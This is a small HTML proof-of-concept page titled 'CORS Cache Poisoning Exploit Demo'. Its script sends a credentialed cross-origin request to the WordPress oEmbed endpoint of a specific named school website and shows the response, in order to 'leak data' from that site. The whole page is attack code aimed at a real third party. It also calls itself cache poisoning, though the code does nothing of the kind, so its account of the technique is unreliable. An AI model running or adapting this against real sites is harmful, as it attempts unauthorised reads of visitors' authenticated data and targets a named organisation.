<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CORS Cache Poisoning Exploit Demo</title>
</head>
<body>
  <h1>Trying to Leak Data from Vulnerable Site</h1>
  <button id="fetchBtn">Fetch Sensitive Data</button>
  <pre id="output" style="white-space: pre-wrap; background:#eee; padding:10px; margin-top:10px;"></pre>

  <script>
    document.getElementById('fetchBtn').onclick = function() {
      fetch('https://lahanparagon.edu.np/wp-json/oembed/1.0/embed', {
        method: 'GET',
        credentials: 'include' // send cookies if any
      })
      .then(response => {
        if (!response.ok) throw new Error('Network response was not ok: ' + response.status);
        return response.text(); // or response.json() if JSON expected
      })
      .then(data => {
        document.getElementById('output').textContent = '✅ Data received:\n\n' + data;
      })
      .catch(error => {
        document.getElementById('output').textContent = '❌ Fetch error:\n\n' + error.message;
      });
    }
  </script>
</body>
</html>
